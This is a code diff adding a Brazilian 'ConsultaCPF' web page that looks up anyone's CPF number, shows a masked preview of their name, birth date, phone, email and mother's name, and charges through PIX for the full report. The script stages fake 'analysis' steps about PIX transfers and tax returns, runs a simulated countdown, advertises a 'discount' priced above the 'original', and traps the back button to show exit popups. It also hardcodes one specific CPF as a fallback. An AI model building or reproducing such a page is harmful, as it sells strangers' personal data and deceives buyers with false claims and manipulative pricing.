+            margin-bottom: 15px;
+        }
+
+        .pix-info-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 10px;
+        }
+
+        .pix-info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .pix-info-row i {
+            color: #3b82f6;
+            font-size: 18px;
+            margin-top: 2px;
+        }
+
+        .pix-info-title {
+            font-weight: 700;
+            color: #1e293b;
+            font-size: 1rem;
+        }
+
+        .pix-info-row span:not(.pix-info-title) {
+            color: #64748b;
+            font-size: 0.9rem;
+            line-height: 1.4;
+        }
+
+        .pix-price-section {
+            background: #f8fafc;
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .pix-price-original {
+            color: #94a3b8;
+            text-decoration: line-through;
+            font-size: 1rem;
+        }
+
+        .pix-price-current {
+            color: #22c55e;
+            font-size: 1.8rem;
+            font-weight: 800;
+        }
+
+        .pix-generate-btn {
+            width: calc(100% - 50px);
+            margin: 0 25px 25px;
+            padding: 16px;
+            background: linear-gradient(90deg, #10b981 0%, #22c55e 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .pix-generate-btn:hover {
+            background: linear-gradient(90deg, #059669 0%, #16a34a 100%);
+            transform: translateY(-2px);
+        }
+
+        .pix-generate-btn:disabled {
+            background: #94a3b8;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Seção do QR Code */
+        .pix-qrcode-section {
+            padding: 0 25px 25px;
+            text-align: center;
+        }
+
+        .pix-qrcode-container {
+            background: white;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 15px;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+
+        .pix-qrcode-container img {
+            width: 180px;
+            height: 180px;
+        }
+
+        .pix-qrcode-instruction {
+            color: #64748b;
+            font-size: 0.9rem;
+            margin-bottom: 15px;
+        }
+
+        .pix-code-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .pix-code-container input {
+            flex: 1;
+            padding: 12px;
+            border: 1px dashed #cbd5e1;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 0.85rem;
+            background: #f8fafc;
+            color: #475569;
+        }
+
+        .pix-copy-btn {
+            padding: 12px 20px;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: background 0.3s ease;
+        }
+
+        .pix-copy-btn:hover {
+            background: #2563eb;
+        }
+
+        .pix-timer-container {
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            border-radius: 8px;
+            padding: 12px;
+            color: #dc2626;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .pix-timer-container strong {
+            font-size: 1.1rem;
+        }
+
+        /* Título do Pagamento PIX */
+        .pix-payment-title {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #1e293b;
+        }
+
+        .pix-payment-title i {
+            color: #3b82f6;
+            font-size: 1.5rem;
+        }
+
+        /* Display de Preço no QR Code */
+        .pix-price-display {
+            text-align: center;
+            margin-bottom: 20px;
+            padding: 12px;
+            background: #f8fafc;
+            border-radius: 8px;
+        }
+
+        .pix-price-label {
+            display: block;
+            color: #64748b;
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+        }
+
+        .pix-price-value {
+            display: block;
+            color: #22c55e;
+            font-size: 1.8rem;
+            font-weight: 800;
+        }
+
+        /* Label do Código PIX */
+        .pix-code-label {
+            display: block;
+            color: #475569;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .pix-code-wrapper {
+            display: flex;
+            gap: 10px;
+        }
+
+        /* Instruções de Pagamento */
+        .pix-instructions {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+        }
+
+        .pix-instructions-title {
+            color: #1e293b;
+            font-size: 1rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .pix-instructions-title::before {
+            content: '';
+            width: 4px;
+            height: 20px;
+            background: #3b82f6;
+            border-radius: 2px;
+        }
+
+        .pix-instructions-list {
+            margin: 0;
+            padding-left: 20px;
+            color: #475569;
+            font-size: 0.95rem;
+            line-height: 1.8;
+        }
+
+        .pix-instructions-list li {
+            margin-bottom: 8px;
+        }
+
+        .pix-instructions-list li:last-child {
+            margin-bottom: 0;
+        }
+
+        .pix-instructions-list strong {
+            color: #1e293b;
+            font-weight: 700;
+        }
+
+        /* Badge de Segurança */
+        .pix-security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+            padding: 10px;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            border-radius: 8px;
+            color: #166534;
+            font-size: 0.85rem;
+        }
+
+        .pix-security-badge i {
+            color: #22c55e;
+        }
+
+        /* Ocultar seção de email quando QR Code aparecer */
+        .pix-modal-body.hidden {
+            display: none;
+        }
+
+        /* Mobile responsiveness for PIX modal */
+        @media (max-width: 640px) {
+            .pix-modal {
+                border-radius: 12px;
+            }
+
+            .pix-modal-header {
+                padding: 20px 20px 15px;
+                flex-direction: column;
+                align-items: center;
+                text-align: center;
+            }
+
+            .pix-modal-header h2 {
+                font-size: 1.2rem;
+            }
+
+            .pix-modal-body {
+                padding: 0 20px 15px;
+            }
+
+            .pix-generate-btn {
+                width: calc(100% - 40px);
+                margin: 0 20px 20px;
+                padding: 14px;
+                font-size: 1rem;
+            }
+
+            .pix-qrcode-section {
+                padding: 0 20px 20px;
+            }
+
+            .pix-qrcode-container img {
+                width: 150px;
+                height: 150px;
+            }
+
+            .pix-code-container {
+                flex-direction: column;
+            }
+
+            .pix-code-wrapper {
+                flex-direction: column;
+            }
+
+            .pix-copy-btn {
+                justify-content: center;
+            }
+
+            .pix-price-current {
+                font-size: 1.5rem;
+            }
+
+            .pix-price-value {
+                font-size: 1.5rem;
+            }
+
+            .pix-instructions {
+                padding: 15px;
+            }
+
+            .pix-instructions-list {
+                font-size: 0.85rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <i class="fas fa-shield-halved"></i>
+                ConsultaCPF
+            </div>
+            <div class="header-badge">
+                <i class="fas fa-lock"></i> 2025/26 - Consulta Segura
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+
+            <div class="form-card">
+                <form id="cpfForm">
+                    <label class="form-label" for="cpfInput">
+                        <i class="fas fa-id-card"></i> Digite o CPF para consultar:
+                    </label>
+                    <input type="tel" id="cpfInput" class="cpf-input" placeholder="000.000.000-00" maxlength="14"
+                        autocomplete="off">
+                    <p class="error-message" id="errorMessage">Por favor, digite um CPF válido com 11 dígitos</p>
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <i class="fas fa-search"></i>
+                        CONSULTAR CPF AGORA
+                    </button>
+                </form>
+
+                <!-- Loading Section -->
+                <div class="loading-section" id="loadingSection">
+                    <p class="loading-title">
+                        <i class="fas fa-spinner fa-spin"></i> Análise em andamento...
+                    </p>
+                    <div style="text-align: center; margin-bottom: 16px;">
+                        <span style="color: #1e293b; font-weight: 700; font-size: 1.1rem;">Dados 2025/26</span>
+                    </div>
+                    <div id="loadingSteps"></div>
+                </div>
+
+                <!-- Result Section -->
+                <div class="result-section" id="resultSection">
+                    <div class="partial-result-card">
+                        <div class="partial-result-header">
+                            <i class="fas fa-lock"></i>
+                            <h3>Prévia das informações encontradas</h3>
+                        </div>
+                        <p style="margin-bottom: 15px; color: #475569;">Desbloqueie para visualizar todas as informações
+                        </p>
+                        <div class="data-grid" id="resultData">
+                            <!-- Data cards will be inserted here by JavaScript -->
+                        </div>
+                    </div>
+
+                    <!-- Payment Appeal Section -->
+                    <div class="payment-appeal">
+                        <div class="payment-appeal-header">
+                            <i class="fas fa-fire"></i> OFERTA POR TEMPO LIMITADO <i class="fas fa-clock"></i> <span
+                                id="countdownTimer">00:00</span>
+                        </div>
+                        <div class="payment-appeal-content">
+                            <h3><i class="fas fa-eye-slash"></i> Liberar Agora o Relatório Completo</h3>
+                            <div class="payment-appeal-price">
+                                <span>De R$ 29,90</span> R$ 87,49
+                                <div class="discount-badge">40% OFF</div>
+                            </div>
+                            <p><i class="fas fa-bolt"></i> Liberação instantânea após pagamento</p>
+                            <button class="liberar-btn" id="liberarAgoraBtn"
+                                onclick="if(typeof window.abrirModalPix === 'function') { window.abrirModalPix(); } else if(typeof openPixModal === 'function') { const cpf = document.getElementById('cpfInput')?.value || '116.531.888-12'; openPixModal(1790, 2990, cpf); } else { console.error('Funções não encontradas'); } return false;"><i
+                                    class="fas fa-rocket"></i> LIBERAR AGORA <i class="fas fa-bolt"></i></button>
+                            <div class="paywall-badges-container">
+                                <div class="paywall-badge">
+                                    <i class="fas fa-check-circle green-icon"></i>
+                                    Pagamento Seguro
+                                </div>
+                                <div class="paywall-badge">
+                                    <i class="fas fa-sync purple-icon"></i>
+                                    Dados de 2025
+                                </div>
+                                <div class="paywall-badge">
+                                    <i class="fas fa-lock blue-icon"></i>
+                                    Protegido LGPD
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button class="new-search-btn" id="newSearchBtn">
+                        <i class="fas fa-search"></i> Nova Consulta
+                    </button>
+                </div>
+
+                <!-- Error Result -->
+                <div class="error-result" id="errorResult">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <h3>CPF não encontrado</h3>
+                    <p id="errorResultText">Não foi possível encontrar dados para este CPF. Verifique o número e tente
+                        novamente.</p>
+                    <button class="new-search-btn" id="errorNewSearchBtn">
+                        <i class="fas fa-search"></i> Tentar Novamente
+                    </button>
+                </div>
+            </div>
+
+            <!-- Trust Badges -->
+            <div class="trust-badges">
+                <div class="trust-badge">
+                    <i class="fas fa-lock"></i>
+                    <span>Consulta 100% segura</span>
+                </div>
+                <div class="trust-badge">
+                    <i class="fas fa-shield-halved"></i>
+                    <span>LGPD Compliant</span>
+                </div>
+                <div class="trust-badge">
+                    <i class="fas fa-key"></i>
+                    <span>Dados Criptografados</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- How it Works -->
+    <section class="how-it-works">
+        <div class="section-title">
+            <h2>Como Funciona?</h2>
+            <p>Processo simples e rápido em apenas 3 passos</p>
+        </div>
+        <div class="steps-container">
+            <div class="step-card">
+                <div class="step-number">1</div>
+                <i class="fas fa-keyboard step-icon"></i>
+                <h3>Digite o CPF</h3>
+                <p>Insira o número do CPF que deseja consultar no campo acima</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">2</div>
+                <i class="fas fa-shield-halved step-icon"></i>
+                <h3>Consulta Segura</h3>
+                <p>Nosso sistema verifica os dados de forma segura e criptografada</p>
+            </div>
+            <div class="step-card">
+                <div class="step-number">3</div>
+                <i class="fas fa-bolt step-icon"></i>
+                <h3>Resultado Instantâneo</h3>
+                <p>Receba as informações completas em poucos segundos</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Automated Process Block (New Position) -->
+    <div class="automated-process-middle">
+        <div class="automated-process-middle-title"><i class="fas fa-check-circle" style="color: #22C55E;"></i> Processo
+            100% Automatizado</div>
+        <div class="automated-process-middle-subtitle">Sem complicações • Sem burocracias • Resultado garantido</div>
+    </div>
+
+    <!-- What AI Will Discover Section -->
+    <section class="what-ai-discovers">
+        <div class="ai-section-title">
+            <h2>O que nossa IA vai descobrir?</h2>
+            <p>IA cruza diversas fontes para informacoes completas e atualizadas</p>
+        </div>
+        <div class="ai-cards-container">
+            <div class="ai-card">
+                <div class="ai-card-icon blue">
+                    <i class="fas fa-file-alt"></i>
+                </div>
+                <h3>Dados Pessoais</h3>
+                <p>Nome completo, idade, estado civil, profissao e documentos</p>
+            </div>
+            <div class="ai-card">
+                <div class="ai-card-icon green">
+                    <i class="fas fa-phone"></i>
+                </div>
+                <h3>Contatos</h3>
+                <p>Telefones, emails e enderecos atualizados</p>
+            </div>
+            <div class="ai-card">
+                <div class="ai-card-icon purple">
+                    <i class="fas fa-users"></i>
+                </div>
+                <h3>Familia</h3>
+                <p>Informacoes sobre familiares e relacionamentos</p>
+            </div>
+            <div class="ai-card">
+                <div class="ai-card-icon orange">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h3>Situacao Financeira</h3>
+                <p>Renda estimada, classe social e historico</p>
+            </div>
+            <div class="ai-card">
+                <div class="ai-card-icon indigo">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h3>Seguranca Total</h3>
+                <p>Dados protegidos com criptografia avancada</p>
+            </div>
+            <div class="ai-card">
+                <div class="ai-card-icon red">
+                    <i class="fas fa-clock"></i>
+                </div>
+                <h3>Resultado Instantaneo</h3>
+                <p>IA processa dados em menos de 5 segundos</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Security Section -->
+    <section class="security-section">
+        <div class="security-badges">
+            <div class="security-badge">
+                <i class="fas fa-check-circle"></i>
+                <span>LGPD Compliant</span>
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>SSL Seguro</span>
+            </div>
+            <div class="security-badge">
+                <i class="fas fa-database"></i>
+                <span>Dados Verificados</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-main">
+                <!-- Coluna 1: Informações da Empresa -->
+                <div class="footer-col">
+                    <h3>Consulta CPF</h3>
+                    <p>Consulta de CPF confiavel e segura. Atuamos como intermediarios entre voce e as fontes oficiais
+                        de dados.</p>
+                    <p>CNPJ: <span id="cnpj-footer">00.000.000/0001-00</span></p>
+                </div>
+
+                <!-- Coluna 2: Navegação -->
+                <div class="footer-col">
+                    <h3>Navegação</h3>
+                    <a href="#">Consultar CPF</a>
+                    <a href="#">Consultar Celular</a>
+                    <a href="#">Já Paguei</a>
+                    <a href="#">Para Empresas</a>
+                </div>
+
+                <!-- Coluna 3: Informações Legais -->
+                <div class="footer-col">
+                    <h3>Informações Legais</h3>
+                    <a href="#">Termos de Uso</a>
+                    <a href="#">Política de Privacidade</a>
+                    <a href="#">Política de Uso Responsável</a>
+                    <a href="#">Solicitar Exclusão de Dados (LGPD)</a>
+                </div>
+
+                <!-- Coluna 4: Contato -->
+                <div class="footer-col footer-contact-info">
+                    <h3>Contato</h3>
+                    <p><span class="contact-label">E-mail:</span> <a href="mailto:contato@consultacpf.com"
+                            id="email-footer">contato@consultacpf.com</a></p>
+                    <p><span class="contact-label">Telefone:</span> <a href="tel:+5511999999999"
+                            id="telefone-footer">(11) 99999-9999</a></p>
+                    <p><span class="contact-label">DPO:</span> <a href="mailto:dpo@consultacpf.com"
+                            id="dpo-footer">dpo@consultacpf.com</a></p>
+
+                    <a href="#" class="footer-button">
+                        <i class="fas fa-check-circle"></i> Já Paguei - Recuperar Consulta
+                    </a>
+                </div>
+            </div>
+
+            <div class="footer-copyright">
+                <p>&copy; 2025/26 ConsultaCPF. Todos os direitos reservados. Em conformidade com a LGPD.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Aguardar DOM estar completamente carregado
+        document.addEventListener('DOMContentLoaded', function () {
+            console.log('DOM carregado, inicializando...');
+        });
+
+        // CPF Input Formatting
+        const cpfInput = document.getElementById('cpfInput');
+        const cpfForm = document.getElementById('cpfForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        const loadingSection = document.getElementById('loadingSection');
+        const loadingSteps = document.getElementById('loadingSteps');
+        const resultSection = document.getElementById('resultSection');
+        const resultData = document.getElementById('resultData');
+        const errorResult = document.getElementById('errorResult');
+        const newSearchBtn = document.getElementById('newSearchBtn');
+        const errorNewSearchBtn = document.getElementById('errorNewSearchBtn');
+
+        // Format CPF as user types
+        cpfInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+
+            if (value.length > 9) {
+                value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
+            } else if (value.length > 6) {
+                value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
+            } else if (value.length > 3) {
+                value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
+            }
+
+            e.target.value = value;
+
+            // Remove error state on input
+            cpfInput.classList.remove('error');
+            errorMessage.classList.remove('show');
+        });
+
+        // Validate CPF
+        function validateCPF(cpf) {
+            const cleanCPF = cpf.replace(/\D/g, '');
+            return cleanCPF.length === 11;
+        }
+
+        // Loading steps animation
+        const analysisSteps = [
+            { text: "Iniciando análise do CPF...", icon: "search" },
+            { text: "Verificando dados cadastrais...", icon: "user" },
+            { text: "Analisando transferências PIX...", icon: "exchange-alt" },
+            { text: "Consultando declarações de IR...", icon: "file-invoice-dollar" },
+            { text: "Verificando situação cadastral...", icon: "clipboard-check" },
+            { text: "Finalizando consulta...", icon: "check-circle" }
+        ];
+
+        async function showLoadingSteps() {
+            loadingSteps.innerHTML = '';
+
+            for (let i = 0; i < analysisSteps.length; i++) {
+                const step = analysisSteps[i];
+                const stepEl = document.createElement('div');
+                stepEl.className = 'loading-step';
+                stepEl.style.animationDelay = `${i * 0.1}s`;
+                stepEl.innerHTML = `
+                    <i class="fas fa-spinner fa-spin spinner"></i>
+                    <i class="fas fa-check check"></i>
+                    <div>
+                        <span>${step.text}</span>
+                        <div class="progress-bar">
+                            <div class="progress-fill"></div>
+                        </div>
+                    </div>
+                `;
+                loadingSteps.appendChild(stepEl);
+
+                await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 400));
+                stepEl.classList.add('completed');
+            }
+        }
+
+        // Form submission
+        cpfForm.addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            const cpf = cpfInput.value;
+
+            if (!validateCPF(cpf)) {
+                cpfInput.classList.add('error');
+                errorMessage.classList.add('show');
+                return;
+            }
+
+            // Hide form elements and show loading
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
+            loadingSection.classList.add('show');
+            resultSection.classList.remove('show');
+            errorResult.classList.remove('show');
+
+            // Start loading animation
+            const loadingPromise = showLoadingSteps();
+
+            // Make API request
+            try {
+                const cleanCPF = cpf.replace(/\D/g, '');
+                const response = await fetch(`get-cpf.php?cpf=${cleanCPF}`);
+                const data = await response.json();
+
+                // Wait for loading animation to complete
+                await loadingPromise;
+
+                if (data.error) {
+                    throw new Error(data.error);
+                }
+
+                if (data.nome) {
+                    // Show results
+                    displayResults(data, cleanCPF);
+                } else {
+                    throw new Error('Dados não encontrados');
+                }
+
+            } catch (error) {
+                await loadingPromise;
+                showError(error.message);
+            }
+        });
+
+        function displayResults(data, cpf) {
+            loadingSection.classList.remove('show');
+
+            const formattedCPF = cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
+
+            // Helper function to mask data
+            const maskName = (name) => {
+                if (!name) return 'Não informado';
+                const parts = name.split(' ');
+                if (parts.length < 2) return parts[0].substring(0, 3) + '***';
+                return parts[0].substring(0, 3) + '*** ' + parts.slice(1).map(p => '***').join(' ');
+            };
+
+            const maskDate = (date) => {
+                if (!date) return 'Não informado';
+                return date.substring(0, 6) + '****';
+            };
+
+            const maskPhone = (phone) => {
+                if (!phone) return 'Não informado';
+                return phone.substring(0, 5) + '****-' + phone.substring(10, 14);
+            };
+
+            const maskEmail = (email) => {
+                if (!email) return 'Não informado';
+                const [user, domain] = email.split('@');
+                return user.substring(0, 3) + '***@' + domain;
+            };
+
+            const dataCards = [
+                {
+                    icon: 'fas fa-lock', // Ícone de cadeado no cabeçalho
+                    label: 'Nome Completo',
+                    value: maskName(data.nome),
+                    unlock: 'Nome completo sem mascaramento será liberado',
+                    confirmed: false
+                },
+                {
+                    icon: 'fas fa-lock', // Ícone de cadeado no cabeçalho
+                    label: 'Data de Nascimento',
+                    value: maskDate(data.nascimento),
+                    unlock: 'Data completa sem mascaramento será liberada',
+                    confirmed: false
+                },
+                {
+                    icon: 'fas fa-lock', // Ícone de cadeado no cabeçalho
+                    label: 'CPF',
+                    value: formattedCPF,
+                    unlock: 'CPF confirmado',
+                    confirmed: true
+                },
+                {
+                    icon: 'fas fa-lock', // Ícone de cadeado no cabeçalho
+                    label: 'Telefone Principal',
+                    value: maskPhone(data.telefone),
+                    unlock: '2 telefones com operadoras (+ 1 adicional)',
+                    confirmed: false
+                },
+                {
+                    icon: 'fas fa-lock', // Ícone de cadeado no cabeçalho
+                    label: 'E-mail Principal',
+                    value: maskEmail(data.email),
+                    unlock: '2 e-mails disponíveis (+ 1 adicional)',
+                    confirmed: false
+                },
+                {
+                    icon: 'fas fa-lock', // Ícone de cadeado no cabeçalho
+                    label: 'Nome da Mãe',
+                    value: maskName(data.mae),
+                    unlock: 'Nome completo da mãe será liberado',
+                    confirmed: false
+                },
+                // Novos cards solicitados
+                {
+                    icon: 'fas fa-exclamation-triangle', // Ícone de atenção
+                    label: 'Status',
+                    value: 'R******', // Simulação de mascaramento
+                    unlock: 'Situação cadastral completa será liberada',
+                    confirmed: false,
+                    class: 'irregular' // Adiciona a classe para o destaque vermelho
+                },
+                {
+                    icon: 'fas fa-lock', // Ícone de cadeado no cabeçalho
+                    label: 'Dados Pessoais Detalhados',
+                    value: '****** anos, ******', // Simulação de mascaramento
+                    unlock: 'Gênero, Idade, Signo disponíveis',
+                    confirmed: false
+                },
+                {
+                    icon: 'fas fa-lock', // Ícone de cadeado no cabeçalho
+                    label: 'Informações Profissionais',
+                    value: 'R$ *.*,***,** - ***', // Simulação de mascaramento
+                    unlock: 'Renda estimada disponíveis',
+                    confirmed: false
+                },
+                {
+                    icon: 'fas fa-lock', // Ícone de cadeado no cabeçalho
+                    label: 'Situação Cadastral Detalhada',
+                    value: '********', // Simulação de mascaramento
+                    unlock: 'Data da situação cadastral e histórico disponível',
+                    confirmed: false
+                },
+            ];
+
+            cpfForm.classList.add('hidden');
+            submitBtn.classList.add('hidden');
+
+            resultData.innerHTML = dataCards.map(card => `
+        <div class="data-card ${card.class || ''}">
+            <div class="data-card-header">
+                <i class="${card.icon}"></i> ${card.label}
+            </div>
+            <div class="data-card-value">${card.value}</div>
+            <div class="data-card-unlock ${card.confirmed ? 'confirmed' : ''}">
+                <i class="${card.confirmed ? 'fas fa-check-circle' : 'fas fa-lock'}"></i> ${card.unlock}
+            </div>
+        </div>
+    `).join('');
+
+            resultSection.classList.add('show');
+        }
+
+        function showError(message) {
+            loadingSection.classList.remove('show');
+            resultSection.classList.remove('show');
+
+            document.getElementById('errorResultText').textContent =
+                message || 'Não foi possível encontrar dados para este CPF. Verifique o número e tente novamente.';
+
+            errorResult.classList.add('show');
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = '<i class="fas fa-search"></i> CONSULTAR CPF AGORA';
+        }
+
+        // New search buttons
+        function resetForm() {
+            cpfInput.value = '';
+            loadingSection.classList.remove('show');
+            resultSection.classList.remove('show');
+            errorResult.classList.remove('show');
+            cpfForm.classList.remove('hidden');
+            submitBtn.classList.remove('hidden');
+            cpfInput.focus();
+        }
+
+        newSearchBtn.addEventListener('click', resetForm);
+        errorNewSearchBtn.addEventListener('click', resetForm);
+
+        // Simulated Countdown Timer
+        function startCountdown() {
+            const timerElement = document.getElementById('countdownTimer');
+            let minutes = 14;
+            let seconds = 59;
+
+            function updateTimer() {
+                const minStr = String(minutes).padStart(2, '0');
+                const secStr = String(seconds).padStart(2, '0');
+                timerElement.innerHTML = `<span class="timer-box">${minStr}</span>:<span class="timer-box">${secStr}</span>`;
+
+                if (minutes === 0 && seconds === 0) {
+                    clearInterval(timerInterval);
+                    timerElement.innerHTML = 'EXPIRADO';
+                    // Optionally, disable the button or change the offer
+                } else {
+                    if (seconds === 0) {
+                        minutes--;
+                        seconds = 59;
+                    } else {
+                        seconds--;
+                    }
+                }
+            }
+
+            const timerInterval = setInterval(updateTimer, 1000);
+            updateTimer(); // Initial call to display immediately
+        }
+
+        // Start the timer when the result section is shown
+        const observer = new MutationObserver((mutationsList, observer) => {
+            for (const mutation of mutationsList) {
+                if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
+                    if (resultSection.classList.contains('show')) {
+                        startCountdown();
+                        observer.disconnect(); // Stop observing once started
+                    }
+                }
+            }
+        });
+
+        observer.observe(resultSection, { attributes: true });
+
+        // Exit Intent Pop-up Logic
+        const exitIntentPopup = document.getElementById('exitIntentPopup');
+        const exitCloseBtn = document.getElementById('exitCloseBtn');
+        const exitOfferBtn = document.getElementById('exitOfferBtn');
+        let popupShown = false;
+
+        function showExitPopup() {
+            if (!popupShown && resultSection.classList.contains('show')) {
+                exitIntentPopup.classList.add('show');
+                popupShown = true;
+            }
+        }
+
+        function hideExitPopup() {
+            exitIntentPopup.classList.remove('show');
+        }
+
+        // Detect mouse movement towards the top of the viewport (desktop)
+        document.addEventListener('mouseout', (e) => {
+            if (e.clientY < 50 && e.relatedTarget === null) {
+                showExitPopup();
+            }
+        });
+
+        // Detect back button press (mobile and desktop)
+        history.pushState(null, null, location.href);
+        window.addEventListener('popstate', function (event) {
+            if (resultSection.classList.contains('show')) {
+                history.pushState(null, null, location.href);
+                showExitPopup();
+            }
+        });
+
+        // Detect page visibility change (tab switching on mobile)
+        document.addEventListener('visibilitychange', function () {
+            if (document.visibilityState === 'hidden' && resultSection.classList.contains('show')) {
+                // User is leaving the page
+            }
+        });
+
+        // Detect touch scroll up on mobile (potential exit)
+        let touchStartY = 0;
+        document.addEventListener('touchstart', function (e) {
+            touchStartY = e.touches[0].clientY;
+        });
+
+        document.addEventListener('touchend', function (e) {
+            const touchEndY = e.changedTouches[0].clientY;
+            const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+            // If user is at top and swiping down (pull to refresh gesture)
+            if (scrollTop <= 0 && touchEndY - touchStartY > 100) {
+                showExitPopup();
+            }
+        });
+
+        // Close button functionality
+        if (exitCloseBtn) {
+            exitCloseBtn.addEventListener('click', hideExitPopup);
+        }
+
+        // Exit offer button functionality
+        if (exitOfferBtn) {
+            exitOfferBtn.addEventListener('click', function () {
+                // Redirect to payment or perform action
+                alert('Redirecionando para pagamento de R$ 8,49...');
+                hideExitPopup();
+            });
+        }
+
+        // Close when clicking outside the modal
+        if (exitIntentPopup) {
+            exitIntentPopup.addEventListener('click', (e) => {
+                if (e.target === exitIntentPopup) {
+                    hideExitPopup();
+                }
+            });
+
+            // Prevent scrolling when popup is active
+            exitIntentPopup.addEventListener('transitionend', () => {
+                if (exitIntentPopup.classList.contains('show')) {
+                    document.body.style.overflow = 'hidden';
+                } else {
+                    document.body.style.overflow = '';
+                }
+            });
+        }
+
+        // =============================================
+        // MODAL DE PAGAMENTO PIX
+        // =============================================
+        // Buscar elementos dinamicamente quando necessário (não armazenar em constantes)
+
+        // Variáveis de controle
+        let currentPixPrice = 8749; // R$ 87,49 em centavos
+        let currentOriginalPrice = 2990; // R$ 29,90 em centavos
+        let pixTimerInterval = null;
+        let currentCpf = '';
+        let currentTransactionId = null;
+        let paymentCheckInterval = null;
+
+        // Função para abrir o modal PIX (tornar global)
+        window.openPixModal = function (price, originalPrice, cpf) {
+            console.log('openPixModal chamado', { price, originalPrice, cpf });
+
+            // Buscar o modal dinamicamente (pode não estar carregado ainda)
+            const modal = document.getElementById('pixPaymentModal');
+            if (!modal) {
+                console.error('Modal PIX não encontrado no DOM');
+                // Tentar novamente após um pequeno delay
+                setTimeout(() => {
+                    const modalRetry = document.getElementById('pixPaymentModal');
+                    if (modalRetry) {
+                        window.openPixModal(price, originalPrice, cpf);
+                    } else {
+                        alert('Erro: Modal de pagamento não encontrado. Por favor, recarregue a página.');
+                    }
+                }, 100);
+                return;
+            }
+
+            currentPixPrice = price;
+            currentOriginalPrice = originalPrice;
+            currentCpf = cpf || '000.000.000-00';
+
+            // Buscar todos os elementos dinamicamente
+            const pixPriceOriginalEl = document.getElementById('pixPriceOriginal');
+            const pixPriceCurrentEl = document.getElementById('pixPriceCurrent');
+            const pixCpfDisplayEl = document.getElementById('pixCpfDisplay');
+            const pixModalBodyEmail = document.getElementById('pixModalBodyEmail');
+            const pixQrcodeSectionEl = document.getElementById('pixQrcodeSection');
+            const pixGenerateBtnEl = document.getElementById('pixGenerateBtn');
+            const pixEmailEl = document.getElementById('pixEmail');
+
+            // Atualizar preços no modal (se os elementos existirem)
+            if (pixPriceOriginalEl) {
+                pixPriceOriginalEl.textContent = 'De R$ ' + (originalPrice / 100).toFixed(2).replace('.', ',');
+            }
+            if (pixPriceCurrentEl) {
+                pixPriceCurrentEl.textContent = 'R$ ' + (price / 100).toFixed(2).replace('.', ',');
+            }
+            if (pixCpfDisplayEl) {
+                pixCpfDisplayEl.textContent = currentCpf;
+            }
+
+            // Resetar estado do modal - mostrar email, ocultar QR Code
+            if (pixModalBodyEmail) {
+                pixModalBodyEmail.classList.remove('hidden');
+            }
+            if (pixQrcodeSectionEl) {
+                pixQrcodeSectionEl.classList.add('hidden');
+            }
+            if (pixGenerateBtnEl) {
+                pixGenerateBtnEl.style.display = 'flex';
+                pixGenerateBtnEl.disabled = false;
